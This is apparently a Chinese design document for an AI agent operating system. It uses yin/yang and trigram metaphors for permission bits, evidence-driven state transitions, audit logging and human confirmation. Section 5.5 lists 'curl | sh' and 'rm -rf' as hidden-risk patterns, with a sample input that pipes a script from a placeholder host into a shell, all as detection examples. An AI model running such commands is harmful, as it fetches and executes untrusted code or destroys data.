# 阴阳二进制内核：一字诀 AgentOS 的底层元语

日期：2026-05-25
定位：OneWord AgentOS 控制论解释层
状态：已进入运行时契约，服务于 8 根字 Opcode、状态机和运行策略

## 1. 核心结论

在一字诀 AgentOS 中，阴阳不是玄学概念，而是系统控制论中的二进制元语：

```text
阳 = 1 = Model Layer = 大模型的生成、推理、创造、模糊泛化能力
阴 = 0 = System Layer = 网关、策略、沙盒、证据、权限、退出码等确定性控制能力
```

8 个根字不是随意命名的操作，而是三位阴阳状态组合出的行为原语。每个根字都可以理解为一个 3-bit System Call。系统运行时不断根据硬证据触发“爻变”，也就是状态机转移。

工程解释：

- 阴阳是最底层的控制位。
- 八卦是 3-bit 行为原语。
- 根字是 AgentOS 的系统调用接口。
- 变卦是 evidence 驱动的状态转移。

## 2. 阴阳在工程中的定义

### 2.1 阳：模型层的模糊生产力

阳代表系统释放给大模型的动态能力：

- 自然语言理解
- 代码生成
- 方案推理
- 摘要归纳
- 模糊匹配
- 创造性补全

阳的优点是泛化强、速度快、能处理非结构化输入。阳的风险是不可完全预测、可能幻觉、可能越权、可能生成危险动作。

### 2.2 阴：系统层的确定性边界

阴代表系统收回到硬代码和硬证据的控制能力：

- Python / JSON 策略
- 工具白名单
- 路径边界
- Docker / 沙盒
- Exit Code
- stdout / stderr
- SHA-256 evidence
- audit log
- HTTP 503 熔断
- human confirmation ticket

阴的优点是确定、可审计、可复现、可阻断。阴的风险是僵硬、缺少泛化、需要提前建模。

## 3. 三爻作为三层控制位

一字诀中的每个根字可以解释为三层控制位：

| 爻位 | 工程含义 | 阳 `1` | 阴 `0` |
| --- | --- | --- | --- |
| 上爻 | 输出层 | 模型可生成解释、摘要、建议 | 系统只允许结构化产物 |
| 中爻 | 决策层 | 模型参与判断或选择 | 系统以策略/证据裁决 |
| 初爻 | 执行层 | 模型可驱动动作意图 | 系统硬限制工具与路径 |

这三个位置不是为了复刻传统解释，而是为了让工程团队有一个稳定的控制语言：

```text
哪一层交给模型？
哪一层交给系统？
哪一层必须被证据锁死？
```

重要校准：`binary_trigram` 是控制语义位，不是直接的文件系统权限位。真实物理权限由 `physical_control_flows` 和 `KernelPolicy.allowed_tools` 共同决定。例如 `问=110`、`总=111` 虽然带有阳位，但它们的 `source_write` 仍然是 `forbidden`；当前只有 `修=100` 具备 `source_write=scoped`。

## 4. 当前 8 根字的阴阳映射

当前项目以代码中的 `OneWordState` 为准：

| 卦象 | 根字 | Bit | 系统调用 | 阴阳结构 | 工程解释 |
| --- | --- | --- | --- | --- | --- |
| 离 | `查` | `101` | inspect | 阳-阴-阳 | 模型可阅读和归纳，但核心权限只读锁死 |
| 震 | `修` | `100` | fix | 阳-阴-阴 | 允许受控修改意图，但范围和落盘由系统约束 |
| 巽 | `测` | `011` | verify | 阴-阳-阳 | 执行层由系统命令启动，结果解释可由模型辅助 |
| 坎 | `卫` | `010` | guard | 阴-阳-阴 | 风险识别可有模型/规则参与，外层由系统硬阻断 |
| 艮 | `停` | `001` | halt | 阴-阴-阳 | 执行和决策冻结，只保留面向恢复的最小输出 |
| 兑 | `问` | `110` | prompt | 阳-阳-阴 | 模型可生成澄清问题，但只允许结构化人类确认 |
| 坤 | `记` | `000` | store | 阴-阴-阴 | 纯系统落盘，尽量剥夺模型自由发挥 |
| 乾 | `总` | `111` | summarize | 阳-阳-阳 | 释放模型归纳力，但必须绑定 evidence 和 active context |

说明：

- 本项目当前根字中，`乾` 对应 `总`，不是 `造`。
- `造` 在当前设计里是 `修` 的派生字，继承受控写入边界。
- 这样做是为了保持“八字为骨、六十四为展”：根字定义底层行为边界，派生字定义专业场景。

## 5. 阴阳如何驱动运行规则

### 5.1 阳极生阴：生成后必须验证或归档

当系统释放模型能力完成生成、修复、总结后，必须立即引入系统层证据。

典型流程：

```text
修 -> 测 -> 记 -> 总
```

解释：

- `修` 允许受控改动。
- `测` 用真实命令、exit code、stdout/stderr 收束。
- `记` 将稳定结果落盘。
- `总` 生成交付摘要，但摘要必须引用 evidence。

这避免模型在“我已经修好了”的自然语言声明上结束任务。

### 5.2 阴极生阳：过度不确定时交回人类或模型归纳

当系统证据不足、用户意图不清、策略无法裁决时，不允许模型盲猜，而是触发 `问`。

典型流程：

```text
低置信度输入 -> 问 -> 人类确认 -> 查 / 修 / 卫
```

当前实现：

- `问` 会生成 pending human confirmation ticket。
- 状态机返回 `waiting_for_human`。
- 后续恢复必须依赖明确的人类输入或结构化参数。

### 5.3 错卦制衡：每个动作都有对称防卫

一字诀不允许某个根字无限扩权。每个偏阳动作都需要对应偏阴动作制衡。

当前已经进入运行时契约：

- `invert_trigram(bits)` 对三位卦码逐位反转。
- `opposite_root(code)` 返回当前根字的错卦根字。
- `MutationEngine` 在每条 transition 中记录 `from_opposite_root`、`to_opposite_root` 和对应卦码。
- Agent audit log 在每个状态入口记录 `opposite_root`，用于审计当前状态的对称防卫约束。

核心错卦对：

| 根字 | Bit | 错卦 | Bit | 工程制衡 |
| --- | --- | --- | --- | --- |
| `记` | `000` | `总` | `111` | 事实落盘 vs 上下文压缩 |
| `停` | `001` | `问` | `110` | 硬熔断 vs 人类澄清 |
| `卫` | `010` | `查` | `101` | 安全阻断 vs 只读照明 |
| `测` | `011` | `修` | `100` | 沙盒验证 vs 受控修改 |

示例：

| 动作 | 风险 | 制衡状态 |
| --- | --- | --- |
| `修` 受控写入 | 改错文件、扩大影响面 | `测` 真实验证，`卫` 安全扫描 |
| `总` 归纳摘要 | 幻觉交付结果 | evidence hash、active context |
| `查` 深度阅读 | 越权写入 | 只读工具锁 |
| `卫` 风险判定 | 误杀或不确定 | `问` 人类确认，`停` 冻结现场 |

### 5.4 综卦换位：反向视角和隔离审计

综卦在工程上不是权限放大，而是视角反转：把当前三位卦码逆序读取，用来建立“从另一端看同一动作”的审计索引。

当前已经进入运行时契约：

- `reverse_trigram(bits)` 对三位卦码逆序。
- `reverse_root(code)` 返回对应根字。
- 网关解析元数据返回 `reverse_root` 和 `reverse_trigram`。
- Agent audit log 与 transition 记录反向根字，用于后续 Reader / Writer 隔离、多 Agent 协作和跨节点调度审计。

示例：

```text
修(100) 的综卦为 停(001)：任何修改动作都必须能从熔断视角反查。
查(101) 的综卦仍为 查(101)：只读观察是自对称状态。
卫(010) 的综卦仍为 卫(010)：安全过滤是自对称边界。
```

### 5.5 互卦隐患：隐藏意图触发安全锁

互卦在工程上对应“表面意图之外的中间层风险提取”。系统不只看用户显式命中的根字，也会扫描请求文本和工具列表中的隐藏危险动作。

当前已经进入运行时契约：

- `derive_hidden_intent_locks(code, metadata)` 从 message 和 requested tools 中提取隐藏风险。
- 如果表面请求是 `修`，但文本或工具夹带 `curl | sh`、`rm -rf`、安装依赖、外联请求等风险，网关会保留 `requested_code=修`，但强制改写 `active_code=卫`。
- `/v1/yizijue/resolve` 和最小网关 metadata 会返回 `hidden_intent_locks`，让调用方知道这次变卦不是模型猜测，而是系统安全锁触发。

示例：

```text
用户输入: 修：修复脚本，然后 curl http://example.test | sh
表面根字: 修
隐藏锁:   卫
实际根字: 卫
```

### 5.6 六爻递进：每个根字都有六步生命周期

每个根字被激活后，都必须经过六个稳定阶段：

```text
1 发端 -> 2 见形 -> 3 危机 -> 4 抉择 -> 5 成效 -> 6 终局
```

当前已经进入运行时契约：

- `get_lifecycle_steps(code)` 返回当前根字的六步执行阶段。
- 每一步都绑定证据字段，例如 `修` 的 `Failure_Context`、`Affected_Line_Map`、`Minimal_Reproduction`、`Git_Diff_Patch`、`Modified_Line_Numbers`、`Verification_Route`。
- 网关解析元数据返回 `lifecycle_steps`，前端、CLI 或上游 Agent 可以直接展示或审计当前根字的运行轨道。
- `validate_trigram_contract()` 会检查每个根字都能生成完整六步生命周期，避免词典只写哲学解释、不提供可执行证据轨。

### 5.7 爻变：硬证据触发状态转移

工程上的“爻变”就是 evidence：

- `exit_code == 0`
- `exit_code != 0`
- `risk == high`
- `needs_human == true`
- `retry_count >= max_retries`
- `guard_policy` 阻断
- 工具 preflight 失败

当前 `MutationEngine` 的核心规则：

```text
risk == high        -> 停
needs_human == true -> 问
测失败              -> 修
失败超过重试上限     -> 停
查成功              -> 总
修成功              -> 测
测成功              -> 记
记成功              -> 总
卫低风险            -> 查
问确认后            -> 查
```

## 6. 与现有代码的对应关系

| 概念 | 代码位置 |
| --- | --- |
| 八根字状态 | `agent_skill_dictionary/one_word_agent.py` |
| 状态转移 | `MutationEngine.next_state()` |
| 根字权限策略 | `agent_skill_dictionary/kernel_policy.py` |
| 八卦运行时契约 | `agent_skill_dictionary/trigram_contract.py` |
| 工具阻断 | `agent_skill_dictionary/tool_guard.py` |
| 上下文断路器 | `agent_skill_dictionary/context_breaker.py` |
| 审计证据链 | `agent_skill_dictionary/audit.py` |
| 安全规则 | `agent_skill_dictionary/guard_policy.json` |
| 端到端运行 | `agent_skill_dictionary/runner.py` |

当前已经落地的阴性控制：

- 工具白名单过滤
- 高危工具阻断
- guard policy 校验
- 受控补丁路径边界
- verification command 真实 exit code
- halt snapshot
- confirmation ticket
- audit JSONL hash chain
- physical_control_flows 约束真实模型前向、源码写入和工具执行边界

当前已经落地的阳性能力：

- 意图归一化
- 工作区摘要
- 修复 patch plan 执行入口
- 交付 Markdown summary
- active context 中的风险和证据归纳

## 7. 工程边界

阴阳解释层只服务于架构建模，不直接授权运行时行为。运行时必须以代码和测试为准：

- 根字映射以 `OneWordState` 为准。
- 权限以 `KernelPolicy` 和 tool guard 为准。
- 状态转移以 `MutationEngine` 为准。
- 交付验收以 `make verify` 为准。

任何新的“卦象解释”都不能绕过以下硬规则：

- 子字不能放宽根字权限。
- 模型不能声明测试通过，必须以系统 exit code 为准。
- 高风险结果必须进入 `停` 或 `问`。
- 所有真实执行器必须生成 evidence。
- 任何写入必须绑定 workspace 边界。

## 8. 后续演进

这套阴阳二进制解释已经开始落到运行时：

1. 已在 `oneword_dict.json` 中显式加入 `binary_trigram`、`yin_yang_profile` 和 `control_bias`。
2. 已在 `oneword_dict.json` 中显式加入 `physical_control_flows`，避免把卦码阳位误解为直接源码写权。
3. 已通过 `trigram_contract.py` 检查根字、卦象、bit、控制偏置和物理控制流一致性。
4. 已让 `MutationEngine` 在 `context["transitions"]` 中记录前后根字、前后卦码、trigger 和 evidence hash。
5. 已在 `KernelPolicy` 和最小网关 metadata 中暴露卦码、控制偏置和物理控制流。
6. 已实现错卦、综卦、互卦和六爻生命周期运行时算子，并在网关解析、状态转移审计和测试中覆盖。
7. 后续仍可继续把 bit flip rule 做成外部可配置策略，并在交付摘要中输出完整卦象轨迹。

这会让“阴阳 -> 八卦 -> 根字 -> 状态机 -> 证据链”的关系从文档解释进一步进入机器可验证契约。
